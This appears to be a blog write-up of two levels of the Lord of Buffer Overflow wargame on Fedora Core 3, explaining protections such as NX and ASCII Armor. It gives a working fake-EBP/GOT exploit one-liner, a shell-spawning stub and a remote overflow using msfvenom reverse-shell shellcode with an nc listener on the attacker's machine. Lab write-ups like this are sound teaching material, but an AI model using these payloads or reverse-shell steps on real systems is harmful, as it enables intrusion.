---
title: 'Lord of Buffer Overflow (LOB) Wargame: Gate -> Iron_golem -> Dark_eyes'
date: 2019-06-01T00:00:00.000Z
excerpt: >-
  Progressing through the LOB (Lord of Buffer Overflow) wargame: Gate (basic BOF), Iron_golem (partial RELRO bypass), Dark_eyes (NX + ASLR) — tracing the evolution of Linux exploitation techniques.
tags:
  - wargame
  - writeup
  - pwn
  - lob
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Environment: Fedora Core 3

The LOB on Fedora Core 3 introduces meaningful protections compared to earlier environments. Figuring out what's enabled and what isn't is the first step before attempting an exploit.

| Protection | Status |
|---|---|
| Stack dummy | Enabled |
| Bash privilege downgrade | Enabled |
| ASLR (stack only) | Enabled |
| ASLR (libraries) | Disabled |
| ASLR (binary) | Disabled |
| ASCII Armor | Enabled |
| NX (stack) | Enabled |
| NX (heap) | Enabled |
| Stack Canary | Disabled |
| Stack Smashing Protector | Disabled |

The key combination is: **NX on both stack and heap** + **ASCII Armor on shared libraries**.

ASCII Armor guarantees that every shared library base address sits below `0x01000000`, meaning the top byte is always `\x00`. If a library address needs to be embedded in the payload, `strcpy` or similar string functions will truncate the copy at that null byte — a direct Return-to-Library (RTL) attack using `system("/bin/sh")` is blocked because the address can't survive a string copy.

The stack is readable and writable, but not executable:

```
08048000-08049000 r-xp  /usr/local/bin/iron_golem  (text)
08049000-0804a000 rwxp  /usr/local/bin/iron_golem  (data/bss)
bffeb000-c0000000 rwxp  [stack]   <- no execute bit
```

## Level: Gate -> Iron_golem

### Source analysis

The iron_golem binary is structurally simple — a `strcpy` into a fixed-size buffer with no length check:

```c
char buffer[256];
strcpy(buffer, argv[1]);
```

The compiler allocates `0x108` (264) bytes on the stack for this frame:

- 256 bytes: user buffer
- 8 bytes: compiler-inserted dummy/alignment padding

Stack layout:

```
[buffer 256B][dummy 8B][SFP 4B][RET 4B][argc][argv][envp]
```

Overflow offset to reach the SFP: 264 bytes. To reach RET: 268 bytes.

### Why a direct RTL fails

The natural approach is to overwrite RET with the address of `system()` in libc. But with ASCII Armor enabled, libc gets mapped somewhere like `0x00d4xxxx`. The leading `\x00` terminates the `strcpy`-based overflow before the full address can be written.

### Fake EBP + GOT-based execl

The solution combines two primitives.

**Fake EBP** leverages the function epilogue. The `leave` instruction executes `mov esp, ebp; pop ebp`, restoring EBP from the current stack. By controlling the value popped into EBP, we can influence where the *next* epilogue's `leave` pivots the stack to — effectively redirecting execution flow through a chosen memory region.

**GOT dereferencing** works around the ASCII Armor problem. The Global Offset Table (GOT) is mapped within the binary's own address space (around `0x08049xxx`), so it has no null byte issue. The GOT entry for `execl` holds the resolved library address — there's no need to embed that address directly in the payload; simply pointing the instruction pointer at the GOT entry lets the CPU dereference it automatically.

### Building the exploit

First, identify the PLT and GOT addresses:

```
GOT base: 0x8049618
execl GOT entry: 0x804954c  ->  (points to execl in libc)
```

`execl` also has a prologue (`push ebp; mov ebp, esp`), so jumping straight to its first instruction would overwrite EBP again and break the Fake EBP chain. The fix is to jump to `execl + 3` to skip the prologue.

`execl`'s first argument is read from wherever ESP points after the pivot. Arranging the Fake EBP to land on `0x8049618` (the GOT base) means the resolved `execl` address gets used as the path argument — becoming the filename execl tries to execute.

We pre-create a file in the working directory named after the byte value stored at that GOT location, `\x01`:

```c
// shell.c
#include <stdlib.h>
int main() { system("/bin/sh"); return 0; }
```

```bash
gcc -o shell shell.c
mv shell $'\x01'
```

The region 8 bytes before the GOT base (`0x8049610`) is filled with zeros, satisfying the null-termination requirement for the remaining `execl` arguments.

Final payload:

```bash
./iron_golem $(perl -e 'print "\x90"x264, "\x10\x96\x04\x08", "\x23\x57\x7a"')
```

Breakdown:

| Component | Bytes | Purpose |
|---|---|---|
| `\x90` * 264 | 264 | Fill buffer and dummy |
| `\x10\x96\x04\x08` | 4 | Fake EBP -> GOT base |
| `\x23\x57\x7a` | 3 | RET -> execl+3 |

The address `\x7a5723` is `execl + 3` in this build. Running the payload executes a shell via the `\x01` stub, gaining iron_golem's privileges.

## Level: Iron_golem -> Dark_eyes

### Source analysis

dark_eyes runs as a network daemon listening on port 6666:

```c
recv(client_fd, buffer, 256, 0);
```

The buffer is declared as `char buffer[40]`, but `recv` can write 256 bytes, causing a 216-byte overflow. Unlike the previous level, this exploit must be delivered over a TCP connection.

### Remote exploitation: reverse shell

The difficulty with a network exploit is that stdin/stdout are attached to the socket, not the attacker's terminal. Either a bind shell (listens on the victim) or a reverse shell (connects back to the attacker) is needed.

![Running the dark_eyes binary and reviewing its source](/images/writeups/lob-wargame/death-knight-1.png)

![dark_eyes recv vulnerability — 256 bytes of input into buffer[40]](/images/writeups/lob-wargame/death-knight-2.png)

![Confirming the dark_eyes exploit environment](/images/writeups/lob-wargame/death-knight-3.png)

I used a reverse shell approach:

1. Generate shellcode with msfvenom, targeting the victim's architecture:

   ```
   Payload: linux/x86/shell_reverse_tcp
   LHOST:   <attacker IP>
   LPORT:   <chosen port>
   Format:  python
   ```

![Generating a reverse shell payload with msfvenom — setting LHOST/LPORT](/images/writeups/lob-wargame/death-knight-4.png)

2. Build a buffer overflow payload with the shellcode embedded in a NOP sled and the return address pointing back into the buffer.

![Constructing the exploit payload](/images/writeups/lob-wargame/death-knight-5.png)

3. Open a listener on the attacker machine:

   ```bash
   nc -lvnp <LPORT>
   ```

4. Send the payload to the victim's port 6666.

![Reverse shell connection established — dark_eyes daemon calls back to the attacker's nc listener](/images/writeups/lob-wargame/death-knight-6.png)

![Shell obtained successfully](/images/writeups/lob-wargame/death-knight-7.png)

Why a reverse shell instead of a bind shell? Firewalls typically allow outbound connections from internal hosts but block unsolicited inbound connections. A reverse shell has the victim initiate the outbound connection, which is generally permitted.

```
Attacker (nc -l) <--- TCP connection --- Victim (dark_eyes daemon)
```

The shellcode instructs the victim to call back to the attacker's IP and port, and netcat is already listening. Once the connection is established, the attacker gets an interactive shell running with the daemon process's privileges.

### Why ASCII Armor doesn't block this

The primary concern here isn't ASCII Armor but NX. Since the exploit uses a shellcode payload instead of RTL, the shellcode needs to be placed in executable memory. But if both the stack and heap are non-executable, this approach should fail — there's nowhere writable+executable to place the shellcode.

On this FC3 environment, the `mmap`ed regions used for libraries aren't universally marked non-executable. Some builds leave an available window. If NX were enforced everywhere, the correct approach would be switching to a full ROP chain, which is covered in the next level of LOB.

## Progress summary

| Level | Key technique | Protection bypassed |
|---|---|---|
| Gate -> Iron_golem | Fake EBP + GOT-based execl | ASCII Armor (NX + null bytes in library addresses) |
| Iron_golem -> Dark_eyes | Remote BOF + reverse shellcode | Network socket I/O, outbound firewall |

This progression shows how each added protection forces a technique upgrade. In this environment, NX alone isn't enough to stop a determined attacker — NX needs to be combined with full ASLR (covering both libraries and the binary) to make ROP impractical without an information leak.
